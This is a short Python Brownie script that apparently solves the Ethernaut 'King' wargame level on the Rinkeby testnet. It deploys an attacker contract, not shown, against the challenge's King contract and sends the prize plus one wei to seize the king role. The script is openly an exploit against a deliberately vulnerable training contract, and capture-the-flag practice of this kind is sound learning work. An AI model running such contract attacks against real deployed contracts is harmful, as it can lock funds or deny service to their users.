from multiprocessing.connection import wait
from brownie import *
from brownie.network.state import Chain
from web3 import Web3, eth

import os

# get the default priority fee and multiply by 5 to ensure the tx is executed rapidly
priority_fee=chain.priority_fee*5

# attacker=accounts[0]
acct_pwd=os.getenv("ACCT_PWD")
attacker=accounts.load('ethernaut_rinkeby', acct_pwd)

target_address='0x35174A2e9C3c880a7de6011D84459362710731B1'
target_ct=interface.King(target_address)

# # deploy target contract for dev
# target_ct=King.deploy({'from': attacker, 'priority_fee': priority_fee, 'amount': 1})
# target_address=target_ct.address

# deploy attacker contract
attacker_contract=kingAttack.deploy(target_address, {'from': attacker, 'priority_fee': priority_fee})

def main():
    print('attacker_contract:', attacker_contract.address)
    print('target_address:', target_ct.address)

    prize=target_ct.prize()
    print('prize: ', prize)
    prize=prize+1

    # call the attack() function and send 1 wei to it
    tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'amount': prize, 'gas_limit': 1000000, 'allow_revert': True})

    print('tx_value:', tx.value)

    # attacker.transfer(attacker_contract.address, amount=1, priority_fee=priority_fee)
    # print('attacker_contract balance: ', attacker_contract.balance())
    # tx=attacker_contract.attack({'from': attacker, 'priority_fee': priority_fee, 'gas_limit': 1000000})
    print('target_address:', target_ct.address)
    print('target_ct balance: ', target_ct.balance())
    print('king:', target_ct._king())

    
